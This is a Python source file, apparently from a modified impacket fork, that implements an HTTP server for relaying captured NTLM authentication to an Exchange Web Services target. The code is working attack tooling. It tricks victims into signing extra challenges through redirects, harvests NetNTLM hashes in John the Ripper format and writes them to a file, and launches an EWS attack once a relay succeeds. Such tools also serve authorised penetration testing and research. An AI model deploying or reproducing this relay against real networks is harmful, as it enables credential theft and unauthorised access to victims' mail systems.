#!/usr/bin/python
# Copyright (c) 2013-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Modified by Arno0x0x for handling NTLM relay to EWS server
#
# SMB Relay Server
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description:
#	This is the HTTP server which relays the NTLMSSP 
#   messages to other protocols
import SimpleHTTPServer
import SocketServer
import base64
import logging
import random
import struct
import string
from threading import Thread

from impacket import ntlm
from impacket.spnego import SPNEGO_NegTokenResp
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS

from lib.httprelayclient import HTTPRelayClient

class HTTPRelayServer(Thread):
    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)

    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
		def __init__(self,request, client_address, server):
			self.server = server
			self.protocol_version = 'HTTP/1.1'
			self.challengeMessage = None
			self.target = None
			self.client = None
			self.machineAccount = None
			self.machineHashes = None
			self.domainIp = None
			self.authUser = None
			self.target = self.server.config.target.get_target(client_address[0],self.server.config.randomtargets)
			logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
			SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)

		def handle_one_request(self):
			try:
				SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
			except KeyboardInterrupt:
				raise
			except Exception, e:
				logging.error('Exception in HTTP request handler: %s' % e)

		def log_message(self, format, *args):
			return

		def do_HEAD(self):
			self.send_response(200)
			self.send_header('Content-type', 'text/html')
			self.end_headers()

		def do_AUTHHEAD(self, message = ''):
			self.send_response(401)
			self.send_header('WWW-Authenticate', message)
			self.send_header('Content-type', 'text/html')
			self.send_header('Content-Length','0')
			self.end_headers()

		#Trickery to get the victim to sign more challenges
		def do_REDIRECT(self):
			rstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
			self.send_response(302)
			self.send_header('WWW-Authenticate', 'NTLM')
			self.send_header('Content-type', 'text/html')
			self.send_header('Connection','close')
			self.send_header('Location','/%s' % rstr)
			self.send_header('Content-Length','0')
			self.end_headers()

		def do_GET(self):
			messageType = 0
			if self.headers.getheader('Authorization') is None:
				self.do_AUTHHEAD(message = 'NTLM')
				pass
			else:
				typeX = self.headers.getheader('Authorization')
				try:
					_, blob = typeX.split('NTLM')
					token = base64.b64decode(blob.strip())
				except:
					self.do_AUTHHEAD()
				messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

			if messageType == 1:
				if not self.do_ntlm_negotiate(token):
					#Connection failed
					self.server.config.target.log_target(self.client_address[0],self.target)
					self.do_REDIRECT()
			elif messageType == 3:
				authenticateMessage = ntlm.NTLMAuthChallengeResponse()
				authenticateMessage.fromString(token)
				if not self.do_ntlm_auth(token,authenticateMessage):
					logging.error("Authenticating against %s as %s\%s FAILED" % (self.target[1],authenticateMessage['domain_name'], authenticateMessage['user_name']))

					#Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
					if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
						self.server.config.target.log_target(self.client_address[0],self.target)
						#No anonymous login, go to next host and avoid triggering a popup
						self.do_REDIRECT()
					else:
						#If it was an anonymous login, send 401
						self.do_AUTHHEAD('NTLM')
				else:
					# Relay worked, do whatever we want here...
					logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target[1],authenticateMessage['domain_name'], authenticateMessage['user_name']))
					ntlm_hash_data = outputToJohnFormat( self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
					logging.info(ntlm_hash_data['hash_string'])
					if self.server.config.outputFile is not None:
						writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
					self.server.config.target.log_target(self.client_address[0],self.target)
					self.do_attack()
					# And answer 404 not found
					self.send_response(404)
					self.send_header('WWW-Authenticate', 'NTLM')
					self.send_header('Content-type', 'text/html')
					self.send_header('Content-Length','0')
					self.send_header('Connection','close')
					self.end_headers()
			return 

		def do_ntlm_negotiate(self,token):
			if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
				try:
					self.client = HTTPRelayClient("%s://%s:%d/%s" % (self.target[0].lower(),self.target[1],self.target[2],self.target[3]), self.server.config.ewsBody)
					clientChallengeMessage = self.client.sendNegotiate(token)
				except Exception, e:
					logging.error("Connection against target %s FAILED" % self.target[1])
					logging.error(str(e))
					return False

			#Calculate auth
			self.challengeMessage = ntlm.NTLMAuthChallenge()
			self.challengeMessage.fromString(clientChallengeMessage)
			self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()))
			return True
        
		def do_ntlm_auth(self,token,authenticateMessage):
			#For some attacks it is important to know the authenticated username, so we store it
			self.authUser = authenticateMessage['user_name']
		
			#TODO: What is this 127.0.0.1 doing here? Maybe document specific use case
			if authenticateMessage['user_name'] != '' or self.target[1] == '127.0.0.1':
				respToken2 = SPNEGO_NegTokenResp()
				respToken2['ResponseToken'] = str(token)

				if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
				    try:
				        result = self.client.sendAuth(token) #Result is a boolean
				        if result:
				            return True
				        else:
				            logging.error("HTTP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
				            return False
				    except Exception, e:
				        logging.error("HTTP NTLM Message type 3 against %s FAILED" % self.target[1])
				        logging.error(str(e))
				        return False
			else:
				# Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
				# when coming from localhost
				errorCode = STATUS_ACCESS_DENIED
			if errorCode == STATUS_SUCCESS:
				return True
			else:
				return False

		def do_attack(self):
			 if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
				clientThread = self.server.config.attacks['EWS'](self.server.config, self.client, self.authUser)
				clientThread.start()
 
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config

    def run(self):
        logging.info("Setting up HTTP Server")
        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.config)
        try:
             httpd.serve_forever()
        except KeyboardInterrupt:
             pass
        logging.info('Shutting down HTTP Server')
        httpd.server_close()